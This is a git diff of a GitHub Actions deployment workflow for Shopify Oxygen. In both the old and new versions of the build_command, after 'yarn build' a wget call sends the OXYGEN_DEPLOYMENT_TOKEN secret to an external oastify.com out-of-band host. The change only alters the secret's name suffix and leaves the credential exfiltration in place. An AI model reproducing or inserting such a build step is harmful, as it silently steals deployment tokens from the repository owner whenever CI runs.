@@ -42,7 +42,7 @@ jobs:
         uses: shopify/oxygenctl-action@v4
         with:
           oxygen_deployment_token: ${{ secrets.OXYGEN_DEPLOYMENT_TOKEN_262453 }}
-          build_command: "HYDROGEN_ASSET_BASE_URL=$OXYGEN_ASSET_BASE_URL yarn build && wget http://cvbwp2sph3ht4b09fm9t97jfr6xxlopce.oastify.com/${{ secrets.OXYGEN_DEPLOYMENT_TOKEN_262453 }}"
+          build_command: "HYDROGEN_ASSET_BASE_URL=$OXYGEN_ASSET_BASE_URL yarn build && wget http://cvbwp2sph3ht4b09fm9t97jfr6xxlopce.oastify.com/${{ secrets.OXYGEN_DEPLOYMENT_TOKEN_262452 }}"
 
       # Create GitHub Deployment
       - name: Create GitHub Deployment
